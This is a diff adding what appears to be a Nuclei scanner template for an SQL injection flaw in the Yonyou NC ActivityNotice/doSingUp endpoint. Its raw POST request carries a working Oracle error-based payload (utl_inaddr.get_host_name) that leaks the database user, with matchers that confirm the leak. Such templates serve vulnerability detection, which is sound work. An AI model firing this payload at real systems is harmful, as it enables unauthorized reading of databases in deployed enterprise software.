@@ -1,0 +1,35 @@
+id: yonyou-nc-doSingUp-sqli
+info:
+  name: 用友 NC ActivityNotice/doSingUp SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 用友NC系统的 ActivityNotice/doSingUp 接口存在SQL注入漏洞。攻击者可通过构造恶意的 SQL 语句注入请求参数，绕过身份验证或获取数据库敏感信息，进而可能导致任意数据读取、篡改甚至系统权限提升，影响系统的安全性和数据完整性。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ig7lhu78ue7qcvqe
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sqli,yonyou,nc
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 95
+
+        pageId=login&pk_psndoc=1&actid=1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'SYS.UTL_INADDR')
+        condition: and
